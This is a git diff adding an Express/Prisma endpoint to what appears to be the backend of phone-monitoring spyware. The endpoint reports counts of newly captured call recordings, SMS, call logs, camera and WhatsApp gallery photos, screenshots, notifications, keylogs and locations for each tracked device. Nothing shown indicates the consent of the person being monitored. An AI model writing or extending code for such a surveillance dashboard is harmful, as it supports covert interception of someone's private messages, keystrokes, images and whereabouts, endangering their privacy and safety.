@@ -826,4 +826,141 @@ router.delete('/:deviceId', async (req, res) => {
     }
 });
 
+/**
+ * GET /api/devices/:deviceId/unread-counts
+ * Get count of new items since given timestamps for each data type
+ * Query params: recordings, sms, calls, photos, screenshots, notifications, keylogs, locations, gallery
+ * Each param should be an ISO timestamp of when that section was last viewed
+ */
+router.get('/:deviceId/unread-counts', async (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const {
+            recordings,
+            sms,
+            calls,
+            photos,
+            screenshots,
+            notifications,
+            keylogs,
+            locations,
+            gallery
+        } = req.query;
+
+        const device = await findDevice(deviceId);
+        if (!device) {
+            return res.status(404).json({ success: false, error: 'Device not found' });
+        }
+
+        const counts = {};
+
+        // Count recordings since last view
+        if (recordings) {
+            const { CallRecording } = require('@prisma/client');
+            const count = await prisma.callRecording.count({
+                where: {
+                    deviceId: device.id,
+                    createdAt: { gt: new Date(recordings) }
+                }
+            });
+            counts.recordings = count;
+        }
+
+        // Count SMS since last view
+        if (sms) {
+            const count = await prisma.smsLog.count({
+                where: {
+                    deviceId: device.id,
+                    syncedAt: { gt: new Date(sms) }
+                }
+            });
+            counts.sms = count;
+        }
+
+        // Count calls since last view
+        if (calls) {
+            const count = await prisma.callLog.count({
+                where: {
+                    deviceId: device.id,
+                    syncedAt: { gt: new Date(calls) }
+                }
+            });
+            counts.calls = count;
+        }
+
+        // Count photos since last view (camera captures)
+        if (photos) {
+            const count = await prisma.photo.count({
+                where: {
+                    deviceId: device.id,
+                    timestamp: { gt: new Date(photos) },
+                    camera: { in: ['front', 'back'] }
+                }
+            });
+            counts.photos = count;
+        }
+
+        // Count gallery photos since last view (auto-synced from WhatsApp, etc.)
+        if (gallery) {
+            const count = await prisma.photo.count({
+                where: {
+                    deviceId: device.id,
+                    timestamp: { gt: new Date(gallery) },
+                    camera: { notIn: ['front', 'back'] }
+                }
+            });
+            counts.gallery = count;
+        }
+
+        // Count screenshots since last view
+        if (screenshots) {
+            const count = await prisma.screenshot.count({
+                where: {
+                    deviceId: device.id,
+                    timestamp: { gt: new Date(screenshots) }
+                }
+            });
+            counts.screenshots = count;
+        }
+
+        // Count notifications since last view
+        if (notifications) {
+            const count = await prisma.notificationLog.count({
+                where: {
+                    deviceId: device.id,
+                    timestamp: { gt: new Date(notifications) }
+                }
+            });
+            counts.notifications = count;
+        }
+
+        // Count keylogs since last view
+        if (keylogs) {
+            const count = await prisma.keylog.count({
+                where: {
+                    deviceId: device.id,
+                    timestamp: { gt: new Date(keylogs) }
+                }
+            });
+            counts.keylogs = count;
+        }
+
+        // Count locations since last view
+        if (locations) {
+            const count = await prisma.location.count({
+                where: {
+                    deviceId: device.id,
+                    timestamp: { gt: new Date(locations) }
+                }
+            });
+            counts.locations = count;
+        }
+
+        res.json({ success: true, counts });
+    } catch (error) {
+        console.error('[DEVICES] Unread counts error:', error);
+        res.status(500).json({ success: false, error: 'Failed to get unread counts' });
+    }
+});
+
 module.exports = router;
